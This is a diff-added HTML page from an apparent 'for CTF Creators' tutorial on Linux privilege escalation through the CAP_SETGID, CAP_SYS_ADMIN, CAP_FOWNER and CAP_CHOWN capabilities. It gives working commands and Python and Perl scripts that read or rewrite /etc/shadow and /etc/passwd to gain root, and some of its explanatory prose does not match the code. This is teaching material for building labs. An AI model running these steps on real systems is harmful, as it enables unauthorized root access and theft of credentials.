+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo /usr/sbin/setcap cap_setgid+ep ./python3
+</span></span><span class="line"><span class="cl">user@pwn:~$ getcap -r ./python3
+</span></span><span class="line"><span class="cl">./python3 <span class="o">=</span> cap_setgid+ep
+</span></span><span class="line"><span class="cl">user@pwn:~$ vim setgid.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>View the groups:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /etc/group <span class="p">|</span> grep shadow
+</span></span><span class="line"><span class="cl">shadow:x:42:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add this Python code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">setgid</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In this case, the <code>shadow</code> group was impersonated so we can read the file <code>/etc/shadow</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ./python3 setgid.py
+</span></span><span class="line"><span class="cl">user@pwn:~$ ls -l /etc/shadow
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root shadow <span class="m">1610</span> oct <span class="m">25</span> 25:45 /etc/shadow
+</span></span><span class="line"><span class="cl">user@pwn:~$ groups
+</span></span><span class="line"><span class="cl">shadow adm cdrom sudo dip plugdev lpadmin lxd sambashare user
+</span></span><span class="line"><span class="cl">user@pwn:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>42<span class="o">(</span>shadow<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>42<span class="o">(</span>shadow<span class="o">)</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/shadow
+</span></span><span class="line"><span class="cl">root:<span class="nv">$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>.:18918:0:99999:7:::
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-cap_sys_admin">Privilege Escalation via CAP_SYS_ADMIN</h1>
+<p>The CAP_SYS_ADMIN capability is one of the most powerful and broad capabilities in the Linux system. It grants a wide range of administrative privileges that are not covered by other specific capabilities. Here are some of the key functions and permissions associated with CAP_SYS_ADMIN:</p>
+<ul>
+<li>Mounting and Unmounting Filesystems: Allows mounting and unmounting of filesystems.</li>
+<li>Setting Disk Quotas: Enables setting disk quotas for users.</li>
+<li>Modifying Kernel Parameters: Permits modification of certain kernel parameters.</li>
+<li>Performing System Reboots: Allows the system to be rebooted.</li>
+<li>Bypassing File Read, Write, and Execute Permissions: Grants the ability to bypass file permissions in certain contexts.</li>
+<li>Managing Namespaces: Allows creation and management of namespaces.</li>
+<li>Accessing Raw Sockets: Permits access to raw sockets, which can be used for network packet manipulation.</li>
+</ul>
+<p>Due to its extensive range of permissions, CAP_SYS_ADMIN is often considered a &ldquo;catch-all&rdquo; capability, and it is crucial to use it with caution. Misuse or overuse of this capability can lead to significant security risks.</p>
+<h2 id="mounting-file-system-example">Mounting File System Example</h2>
+<p>This means that we can <strong>mount/umount filesystems</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cp <span class="k">$(</span>which perl<span class="k">)</span> .
+</span></span><span class="line"><span class="cl">user@pwn:~$ ls perl
+</span></span><span class="line"><span class="cl">perl
+</span></span><span class="line"><span class="cl">user@pwn:~$ sudo /usr/sbin/setcap cap_sys_admin+ep ./perl
+</span></span><span class="line"><span class="cl">user@pwn:~$ getcap -r ./perl
+</span></span><span class="line"><span class="cl">./perl <span class="o">=</span> cap_sys_admin+ep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using Python we can mount a modified <code>passwd</code> file on top of the real <code>passwd</code> file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cp /etc/passwd ./
+</span></span><span class="line"><span class="cl">user@pwn:~$ openssl passwd -1 -salt abc password
+</span></span><span class="line"><span class="cl"><span class="nv">$1$xxxxxxxxxxxxxxxxx</span>/
+</span></span><span class="line"><span class="cl">user@pwn:~$ vim ./passwd
+</span></span><span class="line"><span class="cl">user@pwn:~$ head -n <span class="m">1</span> ./passwd
+</span></span><span class="line"><span class="cl">root:<span class="nv">$1$xxxxxxxxxxxxxxxxxxx</span>/:0:0:root:/root:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Install the required modules:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cpan Sys::Syscall
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Replace the <code>/etc/passwd</code> file by creating the following Perl script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/perl</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">warnings</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Change the source path</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$source</span> <span class="o">=</span> <span class="s">&#34;/home/user/passwd&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$target</span> <span class="o">=</span> <span class="s">&#34;/etc/passwd&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># File System and Options</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$filesystemtype</span> <span class="o">=</span> <span class="s">&#34;none&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$options</span> <span class="o">=</span> <span class="s">&#34;rw&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$mountflags</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>  <span class="c1"># MS_BIND</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Determine the system call number for mount</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$syscall_number</span> <span class="o">=</span> <span class="n">determine_syscall_number</span><span class="p">(</span><span class="s">&#34;mount&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Invoke the system call directly</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">syscall</span><span class="p">(</span><span class="nv">$syscall_number</span><span class="p">,</span> <span class="nv">$source</span><span class="p">,</span> <span class="nv">$target</span><span class="p">,</span> <span class="nv">$filesystemtype</span><span class="p">,</span> <span class="nv">$mountflags</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">die</span> <span class="s">&#34;Error mounting: $!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="s">&#34;Mount successful.\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Helper function to determine the system call number</span>
+</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">determine_syscall_number</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">my</span> <span class="p">(</span><span class="nv">$syscall_name</span><span class="p">)</span> <span class="o">=</span> <span class="nv">@_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">my</span> <span class="nv">$syscall_number</span> <span class="o">=</span> <span class="nb">eval</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">require</span> <span class="s">&#39;syscall.ph&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">eval</span> <span class="s">&#34;&amp;SYS_$syscall_name&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">die</span> <span class="s">&#34;Unable to determine the system call number for $syscall_name: $@&#34;</span> <span class="k">if</span> <span class="vg">$@</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">die</span> <span class="s">&#34;Unable to determine the system call number for $syscall_name&#34;</span> <span class="k">unless</span> <span class="nb">defined</span> <span class="nv">$syscall_number</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$syscall_number</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the above Perl code, we define a Perl subroutine named <code>$mount</code> that wraps the <code>libc.mount</code> function.</p>
+<p>After that, we define the necessary variables (<code>$source</code>, <code>$target</code>, <code>$filesystemtype</code>, <code>$options</code>, and <code>$mountflags</code>) with the corresponding values.</p>
+<p>The code also includes a helper function, <code>determine_syscall_number</code>, which attempts to determine the system call number for a given syscall name (mount in this case). It uses the <code>syscall.ph</code> file, which should be present on your system, to determine the number. The code then invokes the system call using the determined number.</p>
+<p>Please note that the determination of the system call number relies on the presence of the <code>syscall.ph</code> file and the correct mapping of the syscall names. In some cases, additional steps may be required to ensure that the <code>syscall.ph</code> file is available and up to date.</p>
+<p>We could then mount the modified passwd file on <code>/etc/passwd</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ./perl cap_sys_admin.pl
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:<span class="nv">$1$xxxxxxxxxxxxxxxxxxxx</span>/:0:0:root:/root:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we can switch to the root user with the password provided:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ su root
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-cap_fowner">Privilege Escalation via CAP_FOWNER</h1>
+<p>The <code>CAP_FOWNER</code> capability in Linux allows a process to bypass file ownership checks. This means that a process with this capability can perform operations on files as if it were the owner of those files. Here are some key points about <code>CAP_FOWNER</code>:</p>
+<ol>
+<li><strong>Bypass Ownership Checks</strong>: It allows processes to ignore the ownership of files when performing operations such as reading, writing, or executing.</li>
+<li><strong>Modify File Attributes</strong>: Processes can change file attributes, such as permissions, without being the file owner.</li>
+<li><strong>Override Restrictions</strong>: It can override certain restrictions that are normally enforced based on file ownership, providing greater flexibility in managing files.</li>
+</ol>
+<p>This capability is particularly useful for system administrators and certain system processes that need to manage files across different users without being restricted by file ownership. However, it should be used with caution, as it can pose security risks if misused.</p>
+<h2 id="perl-example-2">Perl Example</h2>
+<p>Copy the Perl binary to the current folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cp <span class="k">$(</span>which perl<span class="k">)</span> . 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The capability <code>CAP_FOWNER</code> allows us to <strong>change the permission of a file</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo /usr/sbin/setcap cap_fowner+ep ./perl
+</span></span><span class="line"><span class="cl">user@pwn:~$ getcap -r ./perl
+</span></span><span class="line"><span class="cl">./perl <span class="o">=</span> cap_fowner+ep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The original <code>/etc/shadow</code> permissions are the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -la /etc/shadow
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root shadow <span class="m">1610</span> oct <span class="m">25</span> 15:44 /etc/shadow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If Python has this capability we can modify the permissions of the shadow file, then change the root password, and as a result, elevate privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./perl -e <span class="s1">&#39;chmod 0666, &#34;/etc/shadow&#34;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Change the root password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -la /etc/shadow
+</span></span><span class="line"><span class="cl">-rw-rw-rw- <span class="m">1</span> root shadow <span class="m">1610</span> oct <span class="m">25</span> 15:44 /etc/shadow
+</span></span><span class="line"><span class="cl">user@pwn:~$ vim /etc/shadow
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/passwd <span class="p">|</span> grep ^root
+</span></span><span class="line"><span class="cl">root::0:0:root:/root:/bin/bash <span class="c1"># Doesn&#39;t matter if it has the x</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/shadow <span class="p">|</span> grep ^root
+</span></span><span class="line"><span class="cl">root::18918:0:99999:7:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Elavate to the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ vim /etc/passwd
+</span></span><span class="line"><span class="cl">user@pwn:~$ su root
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/passwd <span class="p">|</span> grep ^root
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash <span class="c1"># With the x</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="python-example-2">Python Example</h2>
+<p>The capability <code>CAP_FOWNER</code> allows us to <strong>change the permission of a file</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo /usr/sbin/setcap cap_fowner+ep ./python3
+</span></span><span class="line"><span class="cl">user@pwn:~$ getcap -r ./python3
+</span></span><span class="line"><span class="cl">./python3 <span class="o">=</span> cap_fowner+ep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The original <code>/etc/shadow</code> permissions are the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -la /etc/shadow
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root shadow <span class="m">1610</span> oct <span class="m">25</span> 15:44 /etc/shadow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If Python has this capability we can modify the permissions of the shadow file, then change the root password, and as a result, elevate privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./python3 -c <span class="s1">&#39;import os;os.chmod(&#34;/etc/shadow&#34;,0o666)&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Change the root password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -la /etc/shadow
+</span></span><span class="line"><span class="cl">-rw-rw-rw- <span class="m">1</span> root shadow <span class="m">1610</span> oct <span class="m">25</span> 15:44 /etc/shadow
+</span></span><span class="line"><span class="cl">user@pwn:~$ vim /etc/shadow
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/passwd <span class="p">|</span> grep ^root
+</span></span><span class="line"><span class="cl">root::0:0:root:/root:/bin/bash <span class="c1"># Doesn&#39;t matter if it has the x</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/shadow <span class="p">|</span> grep ^root
+</span></span><span class="line"><span class="cl">root::18918:0:99999:7:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Elevate to the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ vim /etc/passwd
+</span></span><span class="line"><span class="cl">user@pwn:~$ su root
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/passwd <span class="p">|</span> grep ^root
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash <span class="c1"># With the x</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-cap_chown">Privilege Escalation via CAP_CHOWN</h1>
+<p>The capability <code>CAP_CHOWN</code> allows us to <strong>change the ownership of any file</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo /usr/sbin/setcap cap_chown+ep ./python3
+</span></span><span class="line"><span class="cl">user@pwn:~$ getcap -r ./python3
+</span></span><span class="line"><span class="cl">./python3 <span class="o">=</span> cap_chown+ep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s suppose the Python binary has this capability, we can change the owner of the shadow file, change the root password, and escalate privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /etc/passwd <span class="p">|</span> grep ^user
+</span></span><span class="line"><span class="cl">user:x:1000:1000:user,,,:/home/user:/bin/bash
+</span></span><span class="line"><span class="cl">./python3 -c <span class="s1">&#39;import os;os.chown(&#34;/etc/shadow&#34;,1000,1000)&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can read the /etc/shadow file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ./python3 -c <span class="s1">&#39;import os;os.chown(&#34;/etc/shadow&#34;,1000,1000)&#39;</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ ls -la /etc/shadow
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> user user <span class="m">1610</span> oct <span class="m">25</span> 12:40 /etc/shadow
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/shadow
+</span></span><span class="line"><span class="cl">root:<span class="nv">$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>.:18918:0:99999:7:::
+</span></span><span class="line"><span class="cl">daemon:*:18667:0:99999:7:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="defense">Defense</h1>
+<p>Defending against capabilities can be challenging. Here are some key points to consider:</p>
+<ul>
+<li>Avoid using unnecessary capabilities: Only enable capabilities that are essential for the task at hand.</li>
+<li>Ensure capabilities cannot be exploited: Regularly review and audit capabilities to prevent potential abuse.</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-12-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/capabilities/">Capabilities</a>,&nbsp;<a href="/tags/cap_setuid/">Cap_setuid</a>,&nbsp;<a href="/tags/cap_setgid/">Cap_setgid</a>,&nbsp;<a href="/tags/cap_sys_admin/">Cap_sys_admin</a>,&nbsp;<a href="/tags/cap_chown/">Cap_chown</a>,&nbsp;<a href="/tags/cap_fowner/">Cap_fowner</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux-privesc-credential-hunting/" class="prev" rel="prev" title="Linux Privilege Escalation - Credential Hunting  for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Linux Privilege Escalation - Credential Hunting  for CTF Creators</a>
+            <a href="/linux-privesc-timers/" class="next" rel="next" title="Linux Privilege Escalation - Timers for CTF Creators">Linux Privilege Escalation - Timers for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
